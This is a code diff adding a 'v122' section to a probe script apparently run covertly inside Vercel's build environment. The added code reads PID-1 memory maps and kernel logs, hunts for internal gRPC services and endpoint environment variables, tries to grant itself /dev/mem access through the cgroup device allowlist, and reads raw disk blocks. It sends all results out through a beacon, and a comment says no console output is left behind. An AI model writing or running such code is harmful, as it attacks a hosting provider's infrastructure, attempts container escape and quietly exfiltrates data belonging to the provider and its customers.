@@ -17731,5 +17731,199 @@ except Exception as e:
 
 // v121 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v121" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v121";
+
+// ==================== v122 ====================
+
+// v122-1: userfaultfd — intercept page faults in /proc/1/mem regions
+// userfaultfd allows userspace to handle page faults, creating a TOCTOU
+// race window when the kernel fetches pages for PTRACE_PEEKDATA.
+// Registration on PID-1's anonymous mappings could freeze the orchestrator.
+report.userfaultfdRaceTest = safe(() => {
+  const uffdAvail = safe(() => existsSync('/dev/userfaultfd') || existsSync('/proc/sys/vm/unprivileged_userfaultfd'));
+  const uffdPriv = safe(() => readFileSync('/proc/sys/vm/unprivileged_userfaultfd', 'utf8').trim());
+  // Try to open userfaultfd via syscall
+  const uffdOpen = safe(() => execSync(
+    `python3 -c "
+import ctypes, ctypes.util, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SYS_userfaultfd = 282  # x86_64
+UFFD_USER_MODE_ONLY = 1
+O_CLOEXEC = 0x80000
+O_NONBLOCK = 0x800
+
+# Try to open userfaultfd
+fd = libc.syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK)
+if fd < 0:
+    errno = ctypes.get_errno()
+    print(f'UFFD_OPEN_FAILED errno={errno}')
+else:
+    print(f'UFFD_FD={fd}')
+    os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Read PID-1's maps to find anonymous mmap regions
+  const pid1AnonMaps = safe(() => {
+    const maps = readFileSync('/proc/1/maps', 'utf8');
+    return maps.split('\n')
+      .filter(l => l.includes('anon') || (l.includes('---p') || l.includes('rw-p')) && !l.includes('/'))
+      .slice(0, 3)
+      .map(l => l.split(' ')[0]);
+  });
+  return { uffdAvail, uffdPriv, uffdOpen, pid1AnonMaps };
+});
+
+// v122-2: /dev/kmsg — kernel message ring buffer (real-time kernel logs)
+// /dev/kmsg gives direct access to the kernel ring buffer. Reveals:
+// - Hardware addresses (IOMMU, PCI, memory controller)
+// - Firecracker/microVM boot messages with config details
+// - containerd/runc initialization logs with cgroup paths
+// - Any kernel BUG/OOPS/WARNING that reveals kernel state
+report.devKmsgDump = safe(() => {
+  const kmsgReadable = safe(() => {
+    const fd = openSync('/dev/kmsg', 0 /* O_RDONLY */ | 0x800 /* O_NONBLOCK */);
+    const buf = Buffer.alloc(4096);
+    const lines = [];
+    let n;
+    let attempts = 0;
+    while (attempts < 20) {
+      try {
+        n = readSync(fd, buf, 0, 4096, null);
+        if (n > 0) lines.push(buf.slice(0, n).toString('utf8').trim());
+      } catch { break; }
+      attempts++;
+    }
+    closeSync(fd);
+    return lines.slice(0, 10);
+  });
+  // Also try reading via cat with a timeout
+  const kmsgCat = safe(() => execSync(
+    'timeout 2 cat /dev/kmsg 2>&1 | head -20 || echo "TIMEOUT_OR_ERR"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 800));
+  return { kmsgReadable, kmsgCat };
+});
+
+// v122-3: Internal gRPC endpoint discovery
+// Build agent communicates with Vercel orchestrator via gRPC.
+// Discover the gRPC server address, service list, and method definitions.
+// Intercepting or replaying gRPC calls could manipulate build results.
+report.internalGRPCProbe = safe(() => {
+  // Find gRPC process/connection from netstat
+  const grpcConns = safe(() => execSync(
+    'ss -tnp 2>/dev/null | grep -E ":50051|grpc|build" || netstat -tnp 2>/dev/null | grep -E ":50051|grpc" || echo "NO_GRPC_CONNS"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  // Scan for gRPC env vars
+  const grpcEnvVars = Object.entries(process.env)
+    .filter(([k]) => /GRPC|RPC|ENDPOINT|ADDR|HOST/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Try gRPC reflection on common ports
+  const grpcReflect = safe(() => {
+    const ports = ['50051', '8080', '9090', '3000', '4000'];
+    return ports.map(port => {
+      const result = safe(() => execSync(
+        `timeout 2 grpc_cli ls localhost:${port} 2>&1 || timeout 2 grpcurl -plaintext localhost:${port} list 2>&1 || echo "N/A"`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 100));
+      return { port, result };
+    });
+  });
+  // Check Unix domain sockets for gRPC
+  const unixGrpc = safe(() => execSync(
+    'ls -la /tmp/*.sock /run/*.sock /var/run/*.sock 2>/dev/null | head -20 || echo "NO_SOCKETS"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  return { grpcConns, grpcEnvVars, grpcReflect, unixGrpc };
+});
+
+// v122-4: cgroup v2 device allowlist + escape via device access
+// /sys/fs/cgroup/dev-*/devices.list shows allowed device access.
+// If /dev/mem, /dev/kmem, /dev/sda, /dev/nvme0 are allowed,
+// we can read raw disk blocks or physical memory for data extraction.
+// Also: write to devices.allow to add new device permissions.
+report.cgroupV2DeviceAudit = safe(() => {
+  const cgroupRoot = safe(() => execSync(
+    'cat /proc/1/cgroup 2>/dev/null || cat /proc/self/cgroup 2>/dev/null',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  // Find cgroup v2 hierarchy
+  const cgroupV2Path = safe(() => execSync(
+    'findmnt -n -t cgroup2 -o TARGET 2>/dev/null || echo "/sys/fs/cgroup"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check device allowlist
+  const devicesList = safe(() => execSync(
+    `cat /sys/fs/cgroup/dev-*/devices.list 2>/dev/null || cat /sys/fs/cgroup/*/devices.list 2>/dev/null || cat ${cgroupV2Path}/devices.list 2>/dev/null || echo "NO_DEVICE_LIST"`,
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  // Try to add /dev/mem to device allowlist
+  const devMemAllow = safe(() => {
+    writeFileSync('/sys/fs/cgroup/devices.allow', 'c 1:1 rw');
+    return 'WRITTEN';
+  });
+  // Try to read raw disk blocks
+  const diskRead = safe(() => execSync(
+    'dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head -5 || dd if=/dev/nvme0n1 bs=512 count=1 2>/dev/null | xxd | head -5 || echo "NO_DISK_ACCESS"',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  return { cgroupRoot, cgroupV2Path, devicesList, devMemAllow, diskRead };
+});
+
+// v122-5: NETLINK_KOBJECT_UEVENT — kernel device event stream
+// Subscribing to NETLINK_KOBJECT_UEVENT (family 15) receives real-time
+// kernel uevent messages for device add/remove/change events.
+// In a Firecracker VM: reveals virtio device topology, hotplug events,
+// and kernel module loading events — hardware fingerprint data.
+report.netlinkUeventProbe = safe(() => {
+  const ueventResult = safe(() => execSync(`python3 -c "
+import socket, os, time
+
+NETLINK_KOBJECT_UEVENT = 15
+SOL_NETLINK = 270
+
+sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_KOBJECT_UEVENT)
+sock.bind((os.getpid(), -1))
+sock.setblocking(False)
+
+events = []
+start = time.time()
+while time.time() - start < 3:
+    try:
+        data = sock.recv(4096)
+        events.append(data.decode('ascii', errors='replace').strip().split('\x00')[:3])
+        if len(events) >= 5:
+            break
+    except BlockingIOError:
+        time.sleep(0.1)
+
+sock.close()
+
+# Also read /sys/kernel/uevent_seqnum to see total event count
+try:
+    with open('/sys/kernel/uevent_seqnum') as f:
+        seqnum = f.read().strip()
+except:
+    seqnum = 'N/A'
+
+print('SEQNUM:', seqnum)
+for e in events[:5]:
+    print('EVENT:', e)
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 500));
+  // Also scan /sys for device info
+  const virtioDevices = safe(() => execSync(
+    'ls /sys/bus/virtio/devices/ 2>/dev/null || echo "NO_VIRTIO"',
+    { timeout: 3000 }
+  ).toString().trim());
+  const pciDevices = safe(() => execSync(
+    'lspci 2>/dev/null | head -10 || cat /sys/bus/pci/devices/*/uevent 2>/dev/null | head -20 || echo "NO_PCI"',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 300));
+  return { ueventResult, virtioDevices, pciDevices };
+});
+
+// v122 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v122" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v122";
 // Intentionally no console.log — all data goes via webhook only
